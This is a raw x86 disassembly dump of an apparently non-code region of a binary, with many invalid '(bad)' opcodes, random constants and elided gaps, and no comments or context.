  41ea0f:	push   ebx
  41ea10:	sub    DWORD PTR [edx],ebp
  41ea12:	nop
  41ea13:	imul   edx,edx,0xc289a4cc
  41ea19:	scas   eax,DWORD PTR es:[edi]
  41ea1a:	nop
  41ea1b:	or     bh,BYTE PTR [ecx]
  41ea1d:	fild   WORD PTR [edx+0x797e1ad1]
  41ea23:	add    al,0xf1
  41ea25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea26:	fnstenv [ecx]
  41ea28:	mov    esp,0xbd78fc6c
  41ea2d:	pop    edx
  41ea2e:	mov    ah,0x6f
  41ea30:	mov    esp,0x22538768
  41ea35:	aam    0x34
  41ea37:	in     al,0x5d
  41ea39:	mov    ebx,0xd0137536
  41ea3e:	nop
  41ea3f:	int    0x70
  41ea41:	mov    dh,0xa6
  41ea43:	xor    bh,BYTE PTR [edx+0x32]
  41ea46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea47:	mov    dl,0x76
  41ea49:	aaa    
  41ea4a:	mov    cl,0xa6
  41ea4c:	sub    DWORD PTR [ecx],esp
  41ea4e:	lock cmp al,BYTE PTR [edi]
  41ea51:	je     0xab8f126
  41ea57:	ret    
  41ea58:	pop    esp
  41ea59:	or     BYTE PTR [ebx-0x3dc5833a],0x20
  41ea60:	js     0x41ea62
  41ea62:	push   ecx
  41ea63:	mov    bh,0x54
  41ea65:	int3   
  41ea66:	xchg   ecx,eax
  41ea67:	jnp    0x41ea9d
  41ea69:	sbb    BYTE PTR [eax-0x7d],0x5d
  41ea6d:	push   ecx
  41ea6e:	out    0xf6,al
  41ea70:	nop
  41ea71:	xchg   esi,eax
  41ea72:	push   cs
  41ea73:	mov    ch,0x66
  41ea75:	cmp    dh,ch
  41ea77:	in     eax,0xb5
  41ea79:	cmp    eax,DWORD PTR [eax]
  41ea7b:	xchg   DWORD PTR [ebx-0x5e],ebp
  41ea7e:	cld    
  41ea7f:	sar    DWORD PTR [ebp+ebx*4+0x1069dedc],cl
  41ea86:	mov    al,0x15
  41ea88:	push   esp
  41ea89:	scas   al,BYTE PTR es:[edi]
  41ea8a:	add    ecx,DWORD PTR [ebx+0x4c]
  41ea8d:	mov    al,0x61
  41ea8f:	push   eax
  41ea90:	push   es
  41ea91:	mov    BYTE PTR [esi],dh
  41ea93:	inc    ebp
  41ea94:	mov    ecx,0xd7467798
  41ea99:	repz into 
  41ea9b:	into   
  41ea9c:	add    DWORD PTR [ebp+0x165d259f],edx
  41eaa2:	lea    edi,[ecx]
  41eaa4:	push   ecx
  41eaa5:	jno    0x41ea68
  41eaa7:	dec    ebp
  41eaa8:	xor    al,0xe8
  41eaaa:	lods   al,BYTE PTR ds:[esi]
  41eaab:	jge    0x41eac8
  41eaad:	dec    esp
  41eaae:	imul   BYTE PTR [ebp+0xc]
  41eab1:	xlat   BYTE PTR ds:[ebx]
  41eab2:	inc    edx
  41eab3:	fild   DWORD PTR [ecx-0x1d13c91a]
  41eab9:	inc    ebx
  41eaba:	imul   ebx,DWORD PTR [ecx],0x81680653
  41eac0:	xchg   esp,eax
  41eac1:	jbe    0x41eaad
  41eac3:	ret    0x4d49
  41eac6:	(bad)  
  41eac7:	popf   
  41eac8:	or     edx,esp
  41eaca:	dec    ecx
  41eacb:	fincstp 
  41eacd:	cmp    dh,BYTE PTR [ebp+0x71]
  41ead0:	mov    ch,0xad
  41ead2:	outs   dx,BYTE PTR ds:[esi]
  41ead3:	les    edx,FWORD PTR [ebx+0x40375bfb]
  41ead9:	pop    ds
  41eada:	cmp    al,0x7b
  41eadc:	adc    eax,0x1efc7d73
  41eae1:	leave  
  41eae2:	xchg   ebp,eax
  41eae3:	stos   DWORD PTR es:[edi],eax
  41eae4:	test   eax,0x97bb0c58
  41eae9:	push   ebx
  41eaea:	adc    BYTE PTR [edx+0x6fd9e917],0x22
  41eaf1:	(bad)  
  41eaf2:	not    BYTE PTR es:[edx+0x61]
  41eaf6:	or     cl,BYTE PTR [ecx-0x7ed671f6]
  41eafc:	xchg   ecx,eax
  41eafd:	outs   dx,DWORD PTR ds:[esi]
  41eafe:	and    al,0xc0
  41eb00:	sbb    al,0x46
  41eb02:	popf   
  41eb03:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41eb05:	sbb    ah,BYTE PTR [esi]
  41eb07:	mov    esi,0x2ed247d1
  41eb0c:	push   esp
  41eb0d:	mov    ebp,0x8e07
	...
  41eb72:	add    BYTE PTR [eax],al
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0xc8
  41eb81:	mov    ecx,0x46a86cbe
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    al,0x1
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	adc    eax,0x8e6b90bc
  41eb91:	retf   0xf89
  41eb94:	mov    BYTE PTR [eax-0x3c],cl
  41eb97:	jge    0x41ebc9
  41eb99:	cwde   
  41eb9a:	fisttp WORD PTR [esi]
  41eb9c:	jb     0x41ebd5
  41eb9e:	cld    
  41eb9f:	nop
  41eba0:	ficom  DWORD PTR [ebx+0x541614c1]
  41eba6:	pop    esi
  41eba7:	adc    ch,ch
  41eba9:	icebp  
  41ebaa:	push   edi
  41ebab:	call   DWORD PTR [eax]
  41ebad:	jbe    0x41eb50
  41ebaf:	loopne 0x41ebb6
  41ebb1:	inc    ebx
  41ebb2:	jmp    0xaeb:0x4943953
  41ebb9:	jmp    0xb442:0xd8d94ce9
  41ebc0:	loope  0x41eb4d
  41ebc2:	in     eax,dx
  41ebc3:	adc    eax,0xf9b15339
  41ebc8:	jne    0x41eb72
  41ebca:	fidivr WORD PTR [ecx-0x52]
  41ebcd:	arpl   WORD PTR [edx+0x3ed373f1],bp
  41ebd3:	pop    ss
  41ebd4:	mov    eax,ds:0x41647b47
  41ebd9:	mov    al,ds:0x82ddb834
  41ebde:	xchg   esp,eax
  41ebdf:	es in  eax,dx
  41ebe1:	jo     0x41ebeb
  41ebe3:	xor    al,0x41
  41ebe5:	or     ch,0xa0
  41ebe8:	jp     0x41ec10
  41ebea:	dec    ebx
  41ebeb:	and    eax,0x7361722a
  41ebf0:	(bad)  
  41ebf1:	(bad)  
  41ebf2:	sbb    al,0x6a
  41ebf4:	call   0x40d3e325
  41ebf9:	and    BYTE PTR [esi+0x72ea02a4],bh
  41ebff:	mov    ebp,0x47147ab7
  41ec04:	pop    esi
  41ec05:	and    dl,BYTE PTR [ebx]
  41ec07:	push   eax
  41ec08:	jb     0x41ec56
  41ec0a:	mov    bl,0xd0
  41ec0c:	dec    eax
  41ec0d:	lods   eax,DWORD PTR ds:[esi]
  41ec0e:	pop    ds
  41ec0f:	fiadd  DWORD PTR [eax]
  41ec11:	aam    0xba
  41ec13:	pop    esp
  41ec14:	ins    BYTE PTR es:[edi],dx
  41ec15:	sub    al,0x13
  41ec17:	aad    0x67
  41ec19:	and    BYTE PTR [edi],0x8f
  41ec1c:	mov    es,WORD PTR [eax+0x65]
  41ec1f:	push   ebx
  41ec20:	cmp    eax,0xda15d4f1
  41ec25:	inc    edi
  41ec26:	and    al,0xee
  41ec28:	pop    ebx
  41ec29:	adc    al,0x52
  41ec2b:	js     0x41ebf9
  41ec2d:	stc    
  41ec2e:	sub    eax,0xacce4117
  41ec33:	sub    eax,0x19bf3a43
  41ec38:	lea    ecx,[edi+edi*4-0x3fe23c86]
  41ec3f:	repnz stos BYTE PTR es:[edi],al
  41ec41:	or     al,BYTE PTR [ebx]
  41ec43:	retf   0x8056
  41ec46:	xchg   BYTE PTR [eax+0x50],bl
  41ec49:	dec    esp
  41ec4a:	ins    BYTE PTR es:[edi],dx
  41ec4b:	mov    ecx,DWORD PTR [eax-0x6a58f570]
  41ec51:	jae    0x41ec9e
  41ec53:	loopne 0x41ec42
  41ec55:	shl    DWORD PTR [ebp-0x69],0xc4
  41ec59:	mov    edx,0x593fedd1
  41ec5e:	mov    dl,BYTE PTR [edx-0x2b]
  41ec61:	jmp    0x41ecc2
  41ec63:	clc    
  41ec64:	mov    ch,0x4f
  41ec66:	and    eax,0x83c6aef9
  41ec6b:	sbb    edx,DWORD PTR [ebp-0x72]
  41ec6e:	and    BYTE PTR [ecx+0x6735c118],ah
  41ec74:	push   esi
  41ec75:	pop    ds
  41ec76:	inc    ebp
  41ec77:	repz fild QWORD PTR [edi]
  41ec7a:	and    bl,BYTE PTR [ebp+0x2885d2b0]
  41ec80:	cmp    eax,0x8bda06f7
  41ec85:	or     BYTE PTR [edx+0x1844b32],dh
  41ec8b:	aam    0xdd
  41ec8d:	das    
  41ec8e:	jmp    0x41ed0d
	...
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x2e815fd0
  41ed02:	imul   ebp,DWORD PTR [ecx+0x147ac],0x4
  41ed09:	add    DWORD PTR [eax],eax
  41ed0b:	add    BYTE PTR [edi+0xf],ah
  41ed0e:	and    DWORD PTR [edx],ecx
  41ed10:	pop    esi
  41ed11:	xor    al,0x9c
  41ed13:	sub    ebp,DWORD PTR [esi+eiz*2-0x76]
  41ed17:	lahf   
  41ed18:	out    dx,al
  41ed19:	mov    dh,0xd0
  41ed1b:	and    bl,BYTE PTR [eax+0x15]
  41ed1e:	outs   dx,BYTE PTR ds:[esi]
  41ed1f:	sbb    ch,bh
  41ed21:	arpl   ax,sp
  41ed23:	jmp    0x41ed2e
  41ed25:	jl     0x41ecc5
  41ed27:	xchg   ebp,eax
  41ed28:	nop
  41ed29:	rcr    eax,0xc8
  41ed2c:	fdiv   DWORD PTR [eax]
  41ed2e:	rcl    DWORD PTR [edi-0x4],cl
  41ed31:	inc    cx
  41ed33:	sbb    esp,DWORD PTR [edi]
  41ed35:	sub    edx,ebp
  41ed37:	aaa    
  41ed38:	fld    DWORD PTR ds:0x127b883a
  41ed3e:	enter  0xb5d4,0x76
  41ed42:	push   edx
  41ed43:	mov    bl,0x87
  41ed45:	jg     0x41ed14
  41ed47:	ret    
  41ed48:	mov    ch,0xf8
  41ed4a:	dec    esp
  41ed4b:	mov    WORD PTR [esi+0x70],ss
  41ed4e:	mov    ebx,0x1574d466
  41ed53:	mov    dh,0xae
  41ed55:	retf   0xa761
  41ed58:	jne    0x41ed52
  41ed5a:	pusha  
  41ed5b:	add    BYTE PTR [ebp-0x478735c],0xa9
  41ed62:	sahf   
  41ed63:	sar    BYTE PTR [edx-0x25ab6da8],0x66
  41ed6a:	aas    
  41ed6b:	xor    al,0xbf
  41ed6d:	mov    cl,0x8c
  41ed6f:	(bad)  
  41ed71:	sub    BYTE PTR [ebx+0x6b3bea0e],dh
  41ed77:	sbb    eax,0x413cc79d
  41ed7c:	inc    ecx
  41ed7d:	mov    cl,0x1a
  41ed7f:	xchg   ebp,eax
  41ed80:	iret   
  41ed81:	stos   BYTE PTR es:[edi],al
  41ed82:	sub    eax,0x4bd18587
  41ed87:	push   esp
  41ed88:	push   eax
  41ed89:	lea    edi,[edx]
  41ed8b:	and    BYTE PTR [edx-0x385108e6],cl
  41ed91:	mov    eax,0xfedef1e5
  41ed96:	sub    eax,0x555f80d
  41ed9b:	mov    ds:0x3f053021,al
  41eda0:	push   eax
  41eda1:	es imul ch
  41eda4:	sbb    eax,0xd583835
  41eda9:	cld    
  41edaa:	or     dl,dl
  41edac:	sahf   
  41edad:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41edaf:	sbb    esp,DWORD PTR [esi-0x2a]
  41edb2:	mov    WORD PTR [esi-0x66],ss
  41edb5:	retf   
  41edb6:	pushf  
  41edb7:	pop    ebp
  41edb8:	cmp    al,0xed
  41edba:	fisttp QWORD PTR [edx]
  41edbc:	mov    bh,0x74
  41edbe:	mov    ah,0xdc
  41edc0:	mov    dl,0xbe
  41edc2:	inc    esi
  41edc3:	jecxz  0x41ed98
  41edc5:	lock ss sbb ebx,esi
  41edc9:	fs push es
  41edcb:	pop    eax
  41edcc:	repz (bad) 
  41edce:	push   0xffffff81
  41edd0:	ret    
  41edd1:	jns    0x41eda8
  41edd3:	jmp    0xda8a04ab
  41edd8:	adc    dl,BYTE PTR [ecx+0x75b8e619]
  41edde:	cmp    edi,DWORD PTR [ecx-0x79152ea6]
  41ede4:	push   ecx
  41ede5:	dec    edi
  41ede6:	xor    cl,BYTE PTR [eax]
  41ede8:	pop    ds
  41ede9:	(bad)  
  41edea:	out    dx,al
  41edeb:	xchg   DWORD PTR [edi-0x46],ebx
  41edee:	call   0x2764b716
  41edf3:	popf   
  41edf4:	cmp    eax,0x1271b7af
  41edf9:	jmp    0x5b36:0x865beeba
  41ee00:	es aaa 
  41ee02:	adc    BYTE PTR [ebx+ebp*8-0x6b],cl
  41ee06:	(bad)  
  41ee07:	out    dx,al
  41ee08:	push   ss
  41ee09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee0a:	push   es
  41ee0b:	xor    dh,al
  41ee0d:	stos   BYTE PTR es:[edi],al
  41ee0e:	jnp    0x41edc1
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb09a:0x8508dde7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	inc    edx
  41ee8d:	jl     0x41eeaa
  41ee8f:	xchg   ebx,eax
  41ee90:	(bad)  
  41ee91:	jmp    0x41ee4c
  41ee93:	dec    esi
  41ee94:	adc    DWORD PTR [ecx],0xa775c894
  41ee9a:	js     0x41eee5
  41ee9c:	nop
  41ee9d:	jae    0x41ee77
  41ee9f:	fs xchg esi,eax
  41eea1:	add    eax,0xf1287545
  41eea6:	mov    ah,0xd3
  41eea8:	sub    DWORD PTR [eax-0x16],0xffffffd5
  41eeac:	jo     0x41ee5b
  41eeae:	in     al,dx
  41eeaf:	outs   dx,BYTE PTR ds:[esi]
  41eeb0:	mov    ds:0x1040d702,eax
  41eeb5:	int    0x50
  41eeb7:	or     al,0x16
  41eeb9:	xor    dh,dl
  41eebb:	jne    0x41ee69
  41eebd:	jne    0x41eea7
  41eebf:	add    DWORD PTR [edi+ebx*8-0x2d6e4940],ebp
  41eec6:	mov    cl,0x4c
  41eec8:	(bad)  
  41eec9:	jnp    0x41eec6
  41eecb:	adc    DWORD PTR [edi-0x4a],ecx
  41eece:	in     al,0x54
  41eed0:	xlat   BYTE PTR ds:[ebx]
  41eed1:	daa    
  41eed2:	loopne 0x41ee8e
  41eed4:	xlat   BYTE PTR ds:[ebx]
  41eed5:	dec    edi
  41eed6:	call   DWORD PTR [ecx]
  41eed8:	data16 in al,0xa
  41eedb:	mov    dh,0x5c
  41eedd:	ret    
  41eede:	push   ds
  41eedf:	hlt    
  41eee0:	aaa    
  41eee1:	push   esp
  41eee2:	sbb    eax,0xad5e84f2
  41eee7:	inc    ebp
  41eee8:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eeea:	xchg   ecx,eax
  41eeeb:	push   0x4a
  41eeed:	imul   ebx,DWORD PTR [eax],0xffffffb8
  41eef0:	mov    eax,ds:0xbf62d4a4
  41eef5:	push   cs
  41eef6:	dec    ebp
  41eef7:	xlat   BYTE PTR ds:[ebx]
  41eef8:	cmp    bl,BYTE PTR [edi]
  41eefa:	or     BYTE PTR [edx-0x2c],dl
  41eefd:	out    dx,eax
  41eefe:	imul   edx,DWORD PTR [edi],0x925927d1
  41ef04:	inc    edx
  41ef05:	shl    BYTE PTR [eax+0x1a],0xa0
  41ef09:	inc    edx
  41ef0a:	xchg   esi,eax
  41ef0b:	std    
  41ef0c:	repnz or BYTE PTR [esi-0x32010623],ch
  41ef13:	clc    
  41ef14:	(bad)  
  41ef15:	pop    ds
  41ef16:	pop    esp
  41ef17:	in     al,dx
  41ef18:	popf   
  41ef19:	cdq    
  41ef1a:	mov    dl,0xf3
  41ef1c:	mov    esi,0xe100a4b8
  41ef21:	repnz add al,0x92
  41ef24:	cmc    
  41ef25:	inc    eax
  41ef26:	add    dh,dh
  41ef28:	sbb    ah,BYTE PTR [edx-0x6c0ce085]
  41ef2e:	data16 data16 lock cld 
  41ef32:	add    bl,dh
  41ef34:	sub    edi,DWORD PTR [ebx]
  41ef36:	mov    dh,0x6a
  41ef38:	pop    es
  41ef39:	mov    al,0x7f
  41ef3b:	jns    0x41ef01
  41ef3d:	inc    eax
  41ef3e:	cld    
  41ef3f:	pop    esi
  41ef40:	mov    edi,0xf4260e9a
  41ef45:	mov    ds:0xb373a379,eax
  41ef4a:	test   DWORD PTR [eax+0xeb78239],ebx
  41ef50:	sub    DWORD PTR [esi+ebx*1],ebx
  41ef53:	sub    eax,0x3ca85034
  41ef58:	add    esp,DWORD PTR [ebx]
  41ef5a:	and    eax,edx
  41ef5c:	and    dl,BYTE PTR [eax]
  41ef5e:	sbb    edx,edi
  41ef60:	push   ebx
  41ef61:	in     eax,0xfe
  41ef63:	retf   0xa311
  41ef66:	sub    eax,0xa9094ee
  41ef6b:	retf   0x6172
  41ef6e:	pop    ds
  41ef6f:	loop   0x41efeb
  41ef71:	jmp    0x56dc:0xfcfdd10e
  41ef78:	clc    
  41ef79:	cld    
  41ef7a:	aas    
  41ef7b:	rcr    DWORD PTR [eax-0x3fea3c35],cl
  41ef81:	in     al,0x3e
  41ef83:	cmc    
  41ef84:	pop    esp
  41ef85:	retf   
  41ef86:	call   0x8ab0013d
  41ef8b:	hlt    
  41ef8c:	ds dec ebp
  41ef8e:	xchg   edi,eax
  41ef8f:	cmp    DWORD PTR [eax],eax
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul edx,DWORD PTR [eax],0x4f
  41f002:	dec    ebx
  41f003:	cmp    dh,BYTE PTR [ecx+ecx*2+0x1040001]
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	(bad)  
  41f00d:	mov    ds:0xc8256510,al
  41f012:	inc    ebp
  41f013:	popa   
  41f014:	mov    dh,0x7b
  41f016:	mov    bl,BYTE PTR [ecx-0x1c]
  41f019:	push   es
  41f01a:	mov    DWORD PTR ds:0x969b4c10,ebx
  41f020:	dec    edx
  41f021:	add    bl,BYTE PTR [edx+esi*8-0x440ba19b]
  41f028:	mov    ?,WORD PTR [ecx+0x46]
  41f02b:	cmp    edi,ebx
  41f02d:	add    eax,0xe450b02
  41f032:	dec    ebx
  41f033:	mov    cl,0x7d
  41f035:	pop    esi
  41f036:	test   BYTE PTR [eax+0x6d],cl
  41f039:	sub    ebx,0xae4391ca
  41f03f:	rcl    DWORD PTR [edx+0x5a83f1e3],0x86
  41f046:	in     al,0xcc
  41f048:	fisub  WORD PTR [edx+0x60d9e801]
  41f04e:	ret    
  41f04f:	adc    DWORD PTR ss:[eax],0x5780851
  41f056:	imul   ebp,DWORD PTR [edi],0x8deeea5d
  41f05c:	jle    0x41f065
  41f05e:	(bad)
  41f062:	push   cs
  41f063:	sbb    al,0x99
  41f065:	xlat   BYTE PTR ds:[ebx]
  41f066:	fisub  WORD PTR ds:0x683fefa
  41f06c:	xchg   esi,eax
  41f06d:	js     0x41f0bf
  41f06f:	addr16 pop edx
  41f071:	pop    eax
  41f072:	sbb    eax,0x72b25c5d
  41f077:	inc    edi
  41f078:	pop    ebx
  41f079:	pop    ss
  41f07a:	cmc    
  41f07b:	pop    ecx
  41f07c:	mov    dh,0x18
  41f07e:	mov    WORD PTR [ebx],es
  41f080:	jge    0x41f0dd
  41f082:	fdiv   DWORD PTR [ebp+0x13f86c87]
  41f088:	push   eax
  41f089:	adc    edi,DWORD PTR [eax-0x72]
  41f08c:	test   ch,bh
  41f08e:	sti    
  41f08f:	es jl  0x41f09b
  41f092:	and    edi,esp
  41f094:	mov    ecx,0xcf41d3ee
  41f099:	jl     0x41f059
  41f09b:	popa   
  41f09c:	dec    DWORD PTR [esp+ecx*4]
  41f09f:	xchg   esi,eax
  41f0a0:	xchg   ebx,eax
  41f0a1:	sub    DWORD PTR [ebp+edi*4-0x28601519],ebx
  41f0a8:	jl     0x41f0f8
  41f0aa:	mov    edx,0x1e22c2d4
  41f0af:	inc    eax
  41f0b0:	in     al,dx
  41f0b1:	sbb    DWORD PTR [edx-0x79],ebx
  41f0b4:	mov    esp,0x69c24bc
  41f0b9:	jne    0x41f0b6
  41f0bb:	stc    
  41f0bc:	iret   
  41f0bd:	add    al,0x40
  41f0bf:	or     dl,BYTE PTR [eax+0x8]
  41f0c2:	(bad)  
  41f0c3:	fadd   DWORD PTR [ebx]
  41f0c5:	jo     0x41f09e
  41f0c7:	xor    al,BYTE PTR [eax+0x5d]
  41f0ca:	adc    bh,al
  41f0cc:	inc    ebx
  41f0cd:	mov    edx,0xaaf49e48
  41f0d2:	add    BYTE PTR [edx-0x3df0907e],cl
  41f0d8:	xor    WORD PTR ds:0xc43cde1b,0xa548
  41f0e1:	lods   al,BYTE PTR ds:[esi]
  41f0e2:	mov    esp,0xfa354d48
  41f0e7:	push   cs
  41f0e8:	pop    ds
  41f0e9:	add    ah,BYTE PTR [eax+0x2b34f9f0]
  41f0ef:	pushf  
  41f0f0:	sub    esp,DWORD PTR [ecx-0x1cd4b9f5]
  41f0f6:	xor    DWORD PTR [ecx+0x7b],0xbb00b487
  41f0fd:	test   al,0x21
  41f0ff:	imul   ecx,DWORD PTR [ecx],0x8f09cece
  41f105:	jbe    0x41f133
  41f107:	hlt    
  41f108:	adc    DWORD PTR [ecx],0xffffffb0
  41f10b:	pusha  
  41f10c:	jmp    0xef66a1
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0x8b0730d2
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	rcl    BYTE PTR [edi-0x7bb1add2],1
  41f192:	pop    esp
  41f193:	sbb    eax,0xcce6d8c6
  41f198:	dec    ebx
  41f199:	or     dh,BYTE PTR [ecx]
  41f19b:	or     ecx,DWORD PTR [ecx]
  41f19d:	adc    ch,BYTE PTR [edi+0x71]
  41f1a0:	leave  
  41f1a1:	idiv   BYTE PTR [ecx+0x28]
  41f1a4:	je     0x41f225
  41f1a6:	ins    BYTE PTR es:[edi],dx
  41f1a7:	push   di
  41f1a9:	clc    
  41f1aa:	(bad)  
  41f1ab:	repnz add DWORD PTR [edi-0x6ee58f2d],0x75
  41f1b3:	ss mov edx,0xeb6d6f19
  41f1b9:	lods   eax,DWORD PTR ds:[esi]
  41f1ba:	in     eax,0x18
  41f1bc:	push   eax
  41f1bd:	lods   al,BYTE PTR ds:[esi]
  41f1be:	mov    ch,BYTE PTR [eax]
  41f1c0:	mov    ecx,0x8198d1b6
  41f1c5:	dec    edi
  41f1c6:	stc    
  41f1c7:	inc    esi
  41f1c8:	mov    al,0x24
  41f1ca:	sbb    eax,0x7ba6eb14
  41f1cf:	jp     0x41f15b
  41f1d1:	aad    0x5d
  41f1d3:	adc    al,0x3
  41f1d5:	push   DWORD PTR [ecx-0x1f]
  41f1d8:	mov    cl,0x16
  41f1da:	out    0x46,eax
  41f1dc:	popf   
  41f1dd:	mov    bl,0x23
  41f1df:	in     eax,0xc0
  41f1e1:	ins    DWORD PTR es:[edi],dx
  41f1e2:	add    cl,ch
  41f1e4:	cmc    
  41f1e5:	repz in eax,dx
  41f1e7:	push   eax
  41f1e8:	lahf   
  41f1e9:	mov    ds:0x3f954c34,al
  41f1ee:	hlt    
  41f1ef:	jmp    0x5cae:0xdd106c65
  41f1f6:	sbb    DWORD PTR [ebx-0x23527079],0x8f39fda5
  41f200:	mov    BYTE PTR [esi+0x63],al
  41f203:	mov    bl,0x31
  41f205:	lock sbb DWORD PTR [ecx],0xffffffcb
  41f209:	imul   edi,DWORD PTR [esi+0x2a],0x610f0d38
  41f210:	pop    ecx
  41f211:	jmp    0x41f269
  41f213:	xchg   esp,eax
  41f214:	push   cs
  41f215:	cwde   
  41f216:	pusha  
  41f217:	pushf  
  41f218:	add    ecx,DWORD PTR [ebx]
  41f21a:	cmp    edx,DWORD PTR [edx-0x23d3a64b]
  41f220:	mov    eax,ds:0xbe13ea03
  41f225:	in     al,0xf2
  41f227:	adc    eax,0x721fffeb
  41f22c:	dec    esp
  41f22d:	xor    eax,0xacb7b41
  41f232:	mov    eax,0xd9d46ee0
  41f237:	jecxz  0x41f1be
  41f239:	fld    QWORD PTR [esi-0xb0e685b]
  41f23f:	pop    ecx
  41f240:	lock mov bl,0xd5
  41f243:	in     eax,dx
  41f244:	ins    DWORD PTR es:[edi],dx
  41f245:	xchg   esi,eax
  41f246:	das    
  41f247:	pusha  
  41f248:	je     0x41f288
  41f24a:	sub    edi,ebp
  41f24c:	repz mov dl,0x96
  41f24f:	jbe    0x41f1df
  41f251:	pop    edi
  41f252:	pusha  
  41f253:	jb     0x41f273
  41f255:	in     eax,dx
  41f256:	sub    BYTE PTR [ecx],dl
  41f258:	push   ebx
  41f259:	fist   WORD PTR [eax]
  41f25b:	xor    ecx,eax
  41f25d:	call   0xff39:0xcf57c2b7
  41f264:	shl    esp,1
  41f266:	pop    ecx
  41f267:	jno    0x41f28f
  41f269:	jne    0x41f248
  41f26b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f26c:	icebp  
  41f26d:	cld    
  41f26e:	adc    eax,0x190f6f28
  41f273:	pop    ebx
  41f274:	or     al,0x4b
  41f276:	mov    dl,0x13
  41f278:	cld    
  41f279:	pop    esi
  41f27a:	sub    al,0x43
  41f27c:	outs   dx,DWORD PTR ds:[esi]
  41f27d:	mov    WORD PTR [ecx],?
  41f27f:	cli    
  41f280:	imul   edi,ecx,0x22ce64cb
  41f286:	lahf   
  41f287:	mov    cl,0x39
  41f289:	sahf   
  41f28a:	dec    ecx
  41f28b:	adc    eax,0xa5786bf1
	...
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f30c
  41f301:	mov    cs,WORD PTR [edi-0x32]
  41f304:	mov    esp,0x400014b
  41f309:	add    DWORD PTR [eax],eax
  41f30b:	add    cl,bh
  41f30d:	nop
  41f30e:	sbb    BYTE PTR [ebx],ah
  41f310:	and    edi,esi
  41f312:	dec    esp
  41f313:	jle    0x41f387
  41f315:	rcr    BYTE PTR [ebx-0x5aa60c0e],0xc6
  41f31c:	mov    dh,0x20
  41f31e:	lods   eax,DWORD PTR ds:[esi]
  41f31f:	out    0xfc,eax
  41f321:	jo     0x41f32c
  41f323:	adc    DWORD PTR [eax+0x18],0xaa994528
  41f32a:	sub    al,0x5
  41f32c:	inc    edx
  41f32d:	pop    esp
  41f32e:	adc    DWORD PTR [ecx+eiz*1],edi
  41f331:	neg    DWORD PTR ds:0x81affe85
  41f337:	or     DWORD PTR [esi-0x48],edi
  41f33a:	arpl   dx,di
  41f33c:	js     0x41f2c2
  41f33e:	les    edi,FWORD PTR [edx-0x8e9582b]
  41f344:	fwait
  41f345:	mov    al,0x92
  41f347:	fdiv   QWORD PTR [eax-0x52]
  41f34a:	out    0x88,eax
  41f34c:	mov    ah,0x6c
  41f34e:	or     BYTE PTR [eax+edi*4+0x31],dh
  41f352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f353:	pop    ecx
  41f354:	iret   
  41f355:	in     al,0xe7
  41f357:	xchg   esp,eax
  41f358:	ins    DWORD PTR es:[edi],dx
  41f359:	inc    eax
  41f35a:	iret   
  41f35b:	call   0x1ef29f63
  41f360:	sbb    bh,BYTE PTR [esi-0x45]
  41f363:	nop
  41f364:	add    BYTE PTR [edi],cl
  41f366:	mov    ch,0x6c
  41f368:	mov    ebx,0x502a2ae0
  41f36d:	fmul   QWORD PTR es:[ebx-0x6e9867c7]
  41f374:	(bad)  
  41f375:	rol    BYTE PTR [eax+0x3f],1
  41f378:	enter  0xe48d,0x16
  41f37c:	mov    BYTE PTR [ecx+0x5c],dl
  41f37f:	ins    BYTE PTR es:[edi],dx
  41f380:	mov    al,0xb1
  41f382:	icebp  
  41f383:	dec    esp
  41f384:	xor    BYTE PTR [ecx],dl
  41f386:	repz mov dl,0xd9
  41f389:	lds    ebp,FWORD PTR [edi+eax*4]
  41f38c:	adc    eax,0x4eb6c04
  41f391:	pop    ss
  41f392:	test   DWORD PTR [eax+eax*2+0x21],0x947a71bc
  41f39a:	xchg   edi,eax
  41f39b:	mov    ebp,0xa9be13d4
  41f3a0:	jo     0x41f40e
  41f3a2:	sti    
  41f3a3:	jbe    0x41f38e
  41f3a5:	xor    edx,ebp
  41f3a7:	rol    DWORD PTR [edx-0x5692ecbb],cl
  41f3ad:	add    al,BYTE PTR [esi+0x7642492d]
  41f3b3:	or     eax,0x5138412
  41f3b8:	(bad)  
  41f3b9:	add    BYTE PTR [edi],ch
  41f3bb:	and    al,0x8d
  41f3bd:	aas    
  41f3be:	and    eax,0x8ee6c4a5
  41f3c3:	fsubr  st,st(7)
  41f3c5:	or     BYTE PTR [esi-0x1c68a0f5],dh
  41f3cb:	dec    edx
  41f3cc:	aas    
  41f3cd:	data16 loopne 0x41f443
  41f3d0:	inc    ebx
  41f3d1:	imul   ecx,DWORD PTR [edi+0x1e],0x23
